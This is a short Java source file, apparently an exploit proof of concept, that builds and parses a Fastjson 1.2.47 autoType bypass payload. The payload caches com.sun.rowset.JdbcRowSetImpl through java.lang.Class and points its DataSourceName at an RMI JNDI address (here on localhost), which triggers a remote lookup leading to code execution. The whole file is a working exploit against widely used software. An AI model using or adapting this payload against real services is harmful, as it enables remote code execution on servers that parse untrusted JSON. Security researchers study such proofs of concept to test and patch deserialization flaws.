package com.yyjccc.fastjson.exp.bypass;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;

public class fatsjson1247 {

	public static void main(String[] args) {
		String data=BypassWithClassArray();
		JSON.parse(data);


	}


	public static String BypassWithClassArray(){
		String jndiAddress="rmi://127.0.0.1:8085/dzJvybqs";
		String data="{\n\"a\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"},\n\"b\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\n\"DataSourceName\":\""+jndiAddress+"\",\n\"AutoCommit\":false\n}}";
		System.out.println(data);
		return data;
	}


}
